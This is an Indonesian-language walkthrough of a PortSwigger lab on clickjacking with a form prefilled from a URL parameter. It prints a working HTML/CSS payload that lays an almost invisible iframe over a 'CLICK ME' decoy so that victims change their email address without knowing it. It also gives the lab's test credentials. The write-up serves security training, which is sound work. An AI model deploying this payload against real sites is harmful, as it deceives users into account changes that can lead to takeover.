# Clickjacking dengan Data Input Form yang Diisi Awal dari Parameter URL

Lab ini memperluas contoh clickjacking dasar dalam Lab: Clickjacking Dasar dengan Perlindungan Token CSRF. Tujuan dari lab ini adalah untuk mengubah alamat email pengguna dengan mengisi form secara otomatis menggunakan parameter URL dan menggoda pengguna agar tanpa sadar mengklik tombol "Update email".

Untuk menyelesaikan lab ini, buatlah beberapa HTML yang membingkai halaman akun dan menipu pengguna agar memperbarui alamat email mereka dengan mengklik penjebak "Click me". Lab dianggap selesai ketika alamat email berhasil diubah.

Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut:  
**Username:** wiener  
**Password:** peter

**Catatan:** Korban akan menggunakan Chrome, jadi pastikan untuk menguji exploit Anda di browser tersebut.

**Hint:** Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji exploit, pastikan Anda menggunakan alamat email yang berbeda untuk exploit akhir yang Anda berikan kepada korban.

---------------------------------------------

Referensi:

- [Clickjacking - PortSwigger](https://portswigger.net/web-security/clickjacking)

![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/1.png)

---------------------------------------------

Jika profil pengguna diakses dengan parameter “email”, field email akan terisi otomatis:

![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/2.png)

Jadi, kita dapat mengeksekusi serangan dengan payload seperti ini:

```html
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 470px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>CLICK ME</div>
<iframe id="target_website" src="https://0a670017049ae2c9957a123800ec0089.web-security-academy.net/my-account?email=test@test.com">
</iframe>
```

![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/3.png)

**Penjelasan:**

1. **Style CSS:**  
   - Mengatur iframe agar memiliki ukuran yang besar dan hampir tidak terlihat dengan `opacity: 0.00001;`.
   - Menetapkan `z-index` untuk memastikan iframe berada di atas elemen lain.
   - Mengatur posisi tombol "CLICK ME" agar berada di tempat yang strategis sehingga pengguna tanpa sadar mengklik iframe yang tersembunyi.

2. **Div "CLICK ME":**  
   - Elemen ini berfungsi sebagai umpan untuk menarik perhatian pengguna agar mengkliknya, yang sebenarnya akan mengklik tombol "Update email" di dalam iframe tersembunyi.

3. **Iframe:**  
   - Memuat halaman akun target dengan parameter `email=test@test.com`, yang akan mengubah alamat email pengguna jika form tersebut dikirimkan.
   - Karena iframe hampir tidak terlihat, pengguna tidak menyadari bahwa mereka sebenarnya sedang berinteraksi dengan form yang dapat mengubah data mereka.

Dengan teknik ini, pengguna yang mengunjungi halaman yang berisi payload ini akan secara tidak sadar mengubah alamat email mereka karena mereka mengklik "CLICK ME" yang secara tidak sengaja mengklik tombol "Update email" di dalam iframe tersembunyi.
